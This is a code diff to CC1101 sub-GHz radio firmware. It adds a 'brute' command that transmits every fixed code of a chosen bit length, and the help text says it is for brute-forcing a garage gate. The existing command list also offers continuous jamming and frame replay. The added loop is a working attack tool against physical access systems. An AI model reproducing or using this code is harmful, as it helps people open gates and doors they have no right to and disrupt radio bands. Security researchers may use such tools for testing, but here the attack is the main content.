@@ -167,6 +167,7 @@ static void exec(char *cmdline)
         
     char *command = strsep(&cmdline, " ");
     int setting, setting2, len;
+    uint16_t brute, poweroftwo;    
     byte j, k;
     float settingf1;
     float settingf2;
@@ -217,6 +218,7 @@ static void exec(char *cmdline)
           "rx : Sniffer. Enable or disable printing of received RF packets on serial terminal.\r\n\r\n"
           "tx <hex-vals> : Send packet of max 60 bytes <hex values> over RF\r\n\r\n"
           "jam : Enable or disable continous jamming on selected band.\r\n\r\n"
+          "brute <microseconds> <number-of-bits> : Brute force garage gate with <nb-of-bits> keyword where symbol time is <usec>.\r\n\r\n"            
           "rec : Enable or disable recording frames in the buffer.\r\n\r\n"
           "add <hex-vals> : Manually add single frame payload (max 64 hex values) to the buffer so it can be replayed\r\n\r\n"
           "show : Show content of recording buffer\r\n\r\n"
@@ -610,7 +612,51 @@ static void exec(char *cmdline)
                  jammingmode = 1;
                  receivingmode = 0; };
         Serial.print(F("\r\n")); 
- 
+
+        
+     // handling BRUTE command
+    } else if (strcmp_P(command, PSTR("brute")) == 0) {
+      
+        // take interval period for sampling
+        setting = atoi(strsep(&cmdline, " "));
+        // take number of bits for brute forcing
+        setting2 = atoi(cmdline);
+        // calculate power of 2 upon setting
+        poweroftwo = 1 << setting2;
+                
+        if (setting>0)
+        {        
+        // setup async mode on CC1101 and go into TX mode
+        // with GDO0 pin processing
+        ELECHOUSE_cc1101.setCCMode(0); 
+        ELECHOUSE_cc1101.setPktFormat(3);
+        ELECHOUSE_cc1101.SetTx();
+        
+        //start playing RF with setting GDO0 bit state with bitbanging
+        Serial.print(F("\r\nStarting Brute Forcing press any key to stop...\r\n"));
+        pinMode(gdo0, OUTPUT);
+     
+        for (brute = 0; brute < poweroftwo ; brute++)  
+           { 
+             for(int j = setting2; j > -1; j--)  // j bits in a value brute
+               {
+                 digitalWrite(gdo0, bitRead(brute, j)); // Set GDO0 according to actual brute force value
+                 delayMicroseconds(setting);            // delay for selected sampling interval
+               }; 
+             // checking if key pressed
+             if (Serial.available()) break;
+           };
+
+        Serial.print(F("\r\nBrute forcing complete.\r\n\r\n"));
+        
+        // setting normal pkt format again
+        ELECHOUSE_cc1101.setCCMode(1); 
+        ELECHOUSE_cc1101.setPktFormat(0);
+        ELECHOUSE_cc1101.SetTx();
+        // pinMode(gdo0pin, INPUT);
+        } // end of IF
+        else { Serial.print(F("Wrong parameters.\r\n")); };
+      
 
     // Handling TX command         
        } else if (strcmp_P(command, PSTR("tx")) == 0) {
